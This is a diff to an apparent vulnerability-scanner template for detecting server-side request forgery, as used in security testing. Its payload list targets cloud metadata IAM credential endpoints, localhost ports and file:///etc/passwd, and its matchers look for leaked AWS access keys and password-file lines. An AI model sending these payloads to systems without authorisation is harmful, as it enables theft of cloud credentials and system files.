@@ -1,8 +1,8 @@
 id: generic-ssrf
 info:
   name: Server-Side Request Forgery
-  description: Detects SSRF via URL parameter manipulation
-  owasp_category: A01:2025
+  description: Detects SSRF via URL parameter manipulation across discovered endpoints
+  owasp_category: A03:2025
   severity: high
   tags:
     - ssrf
@@ -10,32 +10,26 @@ info:
     - generic
 
 generic:
-  endpoint: "{{ssrf}}"
+  endpoint: "{{all_discovered}}"
   method: GET
   parameter: "url"
 
   payloads:
+    - "http://169.254.169.254/latest/meta-data/iam/"
     - "http://127.0.0.1:80"
-    - "http://localhost:80"
-    - "http://127.0.0.1:22"
     - "http://localhost:22"
-    - "http://127.0.0.1:443"
-    - "http://169.254.169.254/latest/meta-data/"
-    - "http://metadata.google.internal/computeMetadata/v1/"
     - "file:///etc/passwd"
-    - "http://[::1]"
-    - "http://2130706433"
+    - "http://[::1]/"
 
   matchers:
     - type: regex
       condition: or
       regex:
+        - '"Code"'
+        - '"AccessKeyId"'
+        - '"SecretAccessKey"'
+        - '"ami-"'
         - "root:x:\\d+:\\d+:"
-        - "ami-id"
-        - "Google"
-        - "metadata"
-        - "SSH-2\\.0-"
-        - "Apache"
-        - "nginx"
+        - "OpenSSH"
 
   matchers_condition: or
